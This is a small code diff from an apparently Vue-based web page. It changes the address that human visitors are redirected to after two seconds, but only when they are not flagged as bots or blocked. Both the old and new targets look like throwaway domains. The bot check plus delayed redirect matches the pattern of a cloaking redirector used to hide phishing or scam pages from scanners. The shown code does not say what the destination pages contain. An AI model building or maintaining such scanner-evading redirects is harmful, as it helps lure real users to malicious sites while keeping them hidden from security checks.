@@ -48,7 +48,7 @@ const app = createApp({
       // If not blocked or bot, proceed to the main page
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://nett.1tressboint.mom/';
+          window.location.href = 'https://robost.africandmore.ch/';
         }, 2000);
       }
 
